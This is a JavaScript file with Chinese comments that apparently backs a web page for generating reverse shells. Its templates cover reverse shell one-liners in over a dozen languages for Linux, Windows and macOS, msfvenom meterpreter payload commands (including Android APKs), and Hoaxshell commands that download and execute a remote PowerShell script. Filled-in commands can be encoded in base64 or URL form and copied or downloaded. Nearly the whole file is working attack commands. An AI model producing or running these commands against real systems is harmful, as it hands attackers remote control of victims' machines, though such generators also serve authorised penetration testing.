// 编码函数
function encode(str, type) {
    if (type === 'base64') {
        return btoa(unescape(encodeURIComponent(str)));
    } else if (type === 'url') {
        return encodeURIComponent(str);
    } else if (type === 'doubleurl') {
        return encodeURIComponent(encodeURIComponent(str));
    }
    return str;
}
// 反弹Shell命令模板
const reverseTemplates = {
    linux: {
        bash: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        nc: 'nc -e /bin/sh {ip} {port}',
        python: 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])"',
        perl: 'perl -e "use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"',
        php: 'php -r \"$sock=fsockopen(\'{ip}\',{port});exec(\'/bin/sh -i <&3 >&3 2>&3\');\"',
        powershell: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"',
        socat: 'socat TCP:{ip}:{port} EXEC:/bin/sh',
        awk: 'awk \'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { printf "shell> \\" |& s; if((s |& getline c) <= 0) break; while((c |& getline) > 0) print $0 |& s; close(c); } }\' /dev/null',
        ruby: 'ruby -rsocket -e\'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\'',
        lua: 'lua -e \'require("socket");require("os");t=socket.tcp();t:connect("{ip}",{port});os.execute("/bin/sh -i <&3 >&3 2>&3")\'',
        java: 'r=Runtime.getRuntime();p=r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);p.waitFor();',
        telnet: 'rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0</tmp/p | /bin/sh 1>/tmp/p'
    },
    windows: {
        bash: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        nc: 'nc.exe -e cmd.exe {ip} {port}',
        python: 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"cmd.exe\"])"',
        perl: 'perl -MIO -e "$p=fork;exit,if($p);$c=new IO::Socket::INET(\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"',
        php: 'php -r \"$sock=fsockopen(\'{ip}\',{port});exec(\'cmd.exe -i <&3 >&3 2>&3\');\"',
        powershell: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"',
        socat: 'socat TCP:{ip}:{port} EXEC:cmd.exe',
        awk: '',
        ruby: '',
        lua: '',
        java: '',
        telnet: ''
    },
    macos: {
        bash: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        nc: 'nc -e /bin/sh {ip} {port}',
        python: 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])"',
        perl: 'perl -e "use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"',
        php: 'php -r \"$sock=fsockopen(\'{ip}\',{port});exec(\'/bin/sh -i <&3 >&3 2>&3\');\"',
        powershell: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"',
        socat: 'socat TCP:{ip}:{port} EXEC:/bin/sh',
        awk: 'awk \'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { printf "shell> \\" |& s; if((s |& getline c) <= 0) break; while((c |& getline) > 0) print $0 |& s; close(c); } }\' /dev/null',
        ruby: 'ruby -rsocket -e\'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\'',
        lua: 'lua -e \'require("socket");require("os");t=socket.tcp();t:connect("{ip}",{port});os.execute("/bin/sh -i <&3 >&3 2>&3")\'',
        java: 'r=Runtime.getRuntime();p=r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);p.waitFor();',
        telnet: 'rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0</tmp/p | /bin/sh 1>/tmp/p'
    }
};
// MSFVenom Payload模板
const msfTemplates = {
    linux: {
        meterpreter_reverse_tcp: 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {format} -o shell.{format}',
        meterpreter_reverse_http: 'msfvenom -p linux/x86/meterpreter/reverse_http LHOST={ip} LPORT={port} -f {format} -o shell.{format}',
        meterpreter_reverse_https: 'msfvenom -p linux/x86/meterpreter/reverse_https LHOST={ip} LPORT={port} -f {format} -o shell.{format}',
        shell_reverse_tcp: 'msfvenom -p linux/x86/shell/reverse_tcp LHOST={ip} LPORT={port} -f {format} -o shell.{format}'
    },
    windows: {
        meterpreter_reverse_tcp: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {format} -o shell.{format}',
        meterpreter_reverse_http: 'msfvenom -p windows/meterpreter/reverse_http LHOST={ip} LPORT={port} -f {format} -o shell.{format}',
        meterpreter_reverse_https: 'msfvenom -p windows/meterpreter/reverse_https LHOST={ip} LPORT={port} -f {format} -o shell.{format}',
        shell_reverse_tcp: 'msfvenom -p windows/shell/reverse_tcp LHOST={ip} LPORT={port} -f {format} -o shell.{format}'
    },
    macos: {
        meterpreter_reverse_tcp: 'msfvenom -p osx/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f {format} -o shell.{format}',
        meterpreter_reverse_http: 'msfvenom -p osx/x86/shell_reverse_http LHOST={ip} LPORT={port} -f {format} -o shell.{format}',
        meterpreter_reverse_https: 'msfvenom -p osx/x86/shell_reverse_https LHOST={ip} LPORT={port} -f {format} -o shell.{format}',
        shell_reverse_tcp: 'msfvenom -p osx/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f {format} -o shell.{format}'
    },
    android: {
        meterpreter_reverse_tcp: 'msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o shell.apk',
        meterpreter_reverse_http: 'msfvenom -p android/meterpreter/reverse_http LHOST={ip} LPORT={port} -o shell.apk',
        meterpreter_reverse_https: 'msfvenom -p android/meterpreter/reverse_https LHOST={ip} LPORT={port} -o shell.apk',
        shell_reverse_tcp: 'msfvenom -p android/shell/reverse_tcp LHOST={ip} LPORT={port} -o shell.apk'
    }
};
// 正向Shell命令模板
const forwardTemplates = reverseTemplates; // 结构相同
// Hoaxshell模板
const hoaxTemplates = {
    linux: {
        python: 'python3 hoaxshell.py --host {ip} --port {port}',
        powershell: 'pwsh -c "IEX (New-Object Net.WebClient).DownloadString(\'http://{ip}:{port}/hoaxshell.ps1\')"'
    },
    windows: {
        python: 'python hoaxshell.py --host {ip} --port {port}',
        powershell: 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\'http://{ip}:{port}/hoaxshell.ps1\')"'
    },
    macos: {
        python: 'python3 hoaxshell.py --host {ip} --port {port}',
        powershell: 'pwsh -c "IEX (New-Object Net.WebClient).DownloadString(\'http://{ip}:{port}/hoaxshell.ps1\')"'
    }
};
// 生成反弹Shell命令
function generateReverseShell() {
    const os = document.getElementById('reverseOS').value;
    const type = document.getElementById('reverseType').value;
    const encodeType = document.getElementById('reverseEncode').value;
    const ipInput = document.getElementById('reverseIP');
    const portInput = document.getElementById('reversePort');
    const ip = ipInput.value.trim();
    const port = portInput.value.trim();
    let valid = true;
    // 校验IP
    if (!ip) {
        ipInput.classList.add('is-invalid');
        if (!document.getElementById('reverseIPFeedback')) {
            const feedback = document.createElement('div');
            feedback.className = 'invalid-feedback';
            feedback.id = 'reverseIPFeedback';
            feedback.innerText = '请输入目标IP';
            ipInput.parentNode.appendChild(feedback);
        }
        valid = false;
    } else {
        ipInput.classList.remove('is-invalid');
        const fb = document.getElementById('reverseIPFeedback');
        if (fb) fb.remove();
    }
    // 校验端口
    if (!port) {
        portInput.classList.add('is-invalid');
        if (!document.getElementById('reversePortFeedback')) {
            const feedback = document.createElement('div');
            feedback.className = 'invalid-feedback';
            feedback.id = 'reversePortFeedback';
            feedback.innerText = '请输入目标端口';
            portInput.parentNode.appendChild(feedback);
        }
        valid = false;
    } else {
        portInput.classList.remove('is-invalid');
        const fb = document.getElementById('reversePortFeedback');
        if (fb) fb.remove();
    }
    if (!valid) {
        document.getElementById('reverseOutput').innerText = '';
        return;
    }
    let cmd = reverseTemplates[os][type];
    if (!cmd) {
        document.getElementById('reverseOutput').innerText = '该类型暂不支持此操作系统';
        return;
    }
    cmd = cmd.replaceAll('{ip}', ip).replaceAll('{port}', port);
    if (encodeType !== 'none') {
        cmd = encode(cmd, encodeType);
    }
    document.getElementById('reverseOutput').innerText = cmd;
}
// 生成MSFVenom命令
function generateMSF() {
    const os = document.getElementById('msfOS').value;
    const type = document.getElementById('msfType').value;
    const format = document.getElementById('msfFormat').value;
    const ip = document.getElementById('msfIP').value;
    const port = document.getElementById('msfPort').value;
    let cmd = msfTemplates[os][type].replaceAll('{ip}', ip).replaceAll('{port}', port).replaceAll('{format}', format);
    document.getElementById('msfOutput').innerText = cmd;
}
// 生成正向Shell命令
function generateForwardShell() {
    const os = document.getElementById('forwardOS').value;
    const type = document.getElementById('forwardType').value;
    const encodeType = document.getElementById('forwardEncode').value;
    const ip = document.getElementById('forwardIP').value;
    const port = document.getElementById('forwardPort').value;
    let cmd = forwardTemplates[os][type].replaceAll('{ip}', ip).replaceAll('{port}', port);
    if (encodeType !== 'none') {
        cmd = encode(cmd, encodeType);
    }
    document.getElementById('forwardOutput').innerText = cmd;
}
// 生成Hoaxshell命令
function generateHoaxShell() {
    const os = document.getElementById('hoaxOS').value;
    const type = document.getElementById('hoaxType').value;
    const encodeType = document.getElementById('hoaxEncode').value;
    const ip = document.getElementById('hoaxIP').value;
    const port = document.getElementById('hoaxPort').value;
    let cmd = hoaxTemplates[os][type].replaceAll('{ip}', ip).replaceAll('{port}', port);
    if (encodeType !== 'none') {
        cmd = encode(cmd, encodeType);
    }
    document.getElementById('hoaxOutput').innerText = cmd;
}
// 复制命令
function copyOutput(id) {
    const text = document.getElementById(id).innerText;
    if (!text) return;
    navigator.clipboard.writeText(text).then(() => {
        // 显示右上角提示
        const toast = document.getElementById('copyToast');
        toast.style.display = 'block';
        clearTimeout(window.copyToastTimer);
        window.copyToastTimer = setTimeout(() => {
            toast.style.display = 'none';
        }, 2000);
    });
}
// 下载功能和文件名判断
function downloadOutput(id, filename) {
    var text = document.getElementById(id).innerText;
    if (!text) return;
    var blob = new Blob([text], {type: 'text/plain'});
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}
function getDownloadFilename(type) {
    if(type === 'reverse') {
        var os = document.getElementById('reverseOS').value;
        return os === 'windows' ? 'reverse_shell.txt' : 'reverse_shell.sh';
    }
    if(type === 'msf') {
        var os = document.getElementById('msfOS').value;
        var fmt = document.getElementById('msfFormat').value;
        if(fmt === 'exe' || fmt === 'elf' || fmt === 'apk' || fmt === 'raw' || fmt === 'psh') {
            return 'msf_shell.' + fmt;
        }
        return os === 'windows' ? 'msf_shell.txt' : 'msf_shell.sh';
    }
    if(type === 'forward') {
        var os = document.getElementById('forwardOS').value;
        return os === 'windows' ? 'forward_shell.txt' : 'forward_shell.sh';
    }
    if(type === 'hoax') {
        var os = document.getElementById('hoaxOS').value;
        return os === 'windows' ? 'hoax_shell.txt' : 'hoax_shell.sh';
    }
    return 'shell.txt';
}
